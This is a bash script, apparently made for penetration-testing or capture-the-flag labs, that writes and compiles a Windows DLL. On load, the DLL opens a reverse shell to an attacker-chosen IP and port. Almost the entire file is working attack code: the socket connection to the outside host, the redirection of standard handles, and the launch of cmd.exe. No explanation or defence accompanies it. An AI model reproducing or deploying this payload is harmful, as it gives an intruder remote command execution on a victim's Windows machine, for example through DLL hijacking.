#!/bin/bash

# === DEFAULT CONFIGURATION ===
DEFAULT_IP="10.10.14.91"
DEFAULT_PORT="5555"

# Variables that can be overridden by arguments
IP="$DEFAULT_IP"
PORT="$DEFAULT_PORT"

# === USAGE ===
usage() {
    echo "Usage: $0 [--ip <IP>] [--port <PORT>]"
    echo "Example:"
    echo "  $0                        # Use default IP and port"
    echo "  $0 --ip 192.168.1.100     # Change only IP"
    echo "  $0 --port 4444            # Change only port"
    echo "  $0 --ip 192.168.1.100 --port 443"
    exit 1
}

# === ARGUMENT PARSING ===
while [[ $# -gt 0 ]]; do
    case "$1" in
        --ip)
            if [[ -z "$2" || "$2" =~ ^-- ]]; then
                echo "[-] Error: --ip requires a value."
                usage
            fi
            IP="$2"
            shift 2
            ;;
        --port)
            if [[ -z "$2" || "$2" =~ ^-- ]]; then
                echo "[-] Error: --port requires a value."
                usage
            fi
            if ! [[ "$2" =~ ^[0-9]+$ ]] || [ "$2" -lt 1 ] || [ "$2" -gt 65535 ]; then
                echo "[-] Invalid port: '$2'. Must be a number between 1 and 65535."
                exit 1
            fi
            PORT="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            usage
            ;;
    esac
done

# Minimal validation
if [[ -z "$IP" ]]; then
    echo "[-] IP cannot be empty."
    exit 1
fi

# Validate basic IP format (optional, improves UX)
if ! [[ "$IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo "[-] Invalid IP format: $IP"
    exit 1
fi

# === GENERATE module.c ===
cat > module.c << EOF
// module.c - Reverse Shell 100% Windows API (no CRT)
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call != DLL_PROCESS_ATTACH) return TRUE;

    // === Load Winsock manually ===
    HMODULE hWinsock = LoadLibraryA("WS2_32.DLL");
    if (!hWinsock) return FALSE;

    typedef int (__stdcall *pWSAStartup)(WORD, LPWSADATA);
    typedef SOCKET (__stdcall *pWSASocket)(int, int, int, void*, DWORD, DWORD);
    typedef int (__stdcall *pconnect)(SOCKET, const struct sockaddr*, int);
    typedef u_short (__stdcall *phtons)(u_short);
    typedef unsigned long (__stdcall *pinet_addr)(const char*);
    typedef int (__stdcall *pclosesocket)(SOCKET);
    typedef int (__stdcall *pWSACleanup)(void);

    pWSAStartup WSAStartup = (pWSAStartup)GetProcAddress(hWinsock, "WSAStartup");
    pWSASocket WSASocket = (pWSASocket)GetProcAddress(hWinsock, "WSASocketA");
    pconnect connect = (pconnect)GetProcAddress(hWinsock, "connect");
    phtons htons = (phtons)GetProcAddress(hWinsock, "htons");
    pinet_addr inet_addr = (pinet_addr)GetProcAddress(hWinsock, "inet_addr");
    pclosesocket closesocket = (pclosesocket)GetProcAddress(hWinsock, "closesocket");
    pWSACleanup WSACleanup = (pWSACleanup)GetProcAddress(hWinsock, "WSACleanup");

    if (!WSAStartup || !WSASocket || !connect || !htons || !inet_addr || !closesocket || !WSACleanup) {
        return FALSE;
    }

    // === Initialize Winsock ===
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return FALSE;
    }

    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons($PORT);
    addr.sin_addr.s_addr = inet_addr("$IP");

    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return FALSE;
    }

    // === Redirect handles using SetStdHandle ===
    HANDLE hSocket = (HANDLE)s;
    SetStdHandle(STD_INPUT_HANDLE,  hSocket);
    SetStdHandle(STD_OUTPUT_HANDLE, hSocket);
    SetStdHandle(STD_ERROR_HANDLE,  hSocket);

    // === Create cmd.exe without system() ===
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hSocket;
    si.hStdOutput = hSocket;
    si.hStdError = hSocket;

    // Use a full path for cmd.exe
    if (CreateProcessA("C:\\\\Windows\\\\System32\\\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // === Cleanup ===
    closesocket(s);
    WSACleanup();
    return TRUE;
}
EOF

echo "[+] C file generated: module.c"

# === COMPILE AS DLL ===
echo "[*] Compiling module.dll..."

x86_64-w64-mingw32-gcc module.c -o module.dll -shared -s \
  -nostdlib -nodefaultlibs -lkernel32 -lws2_32 \
  -e DllMain 2>/dev/null

if [ $? -ne 0 ]; then
    echo "[-] Error compiling C code."
    exit 1
fi

echo "[+] Compilation successful: module.dll"
echo "[*] IP: $IP | Port: $PORT"
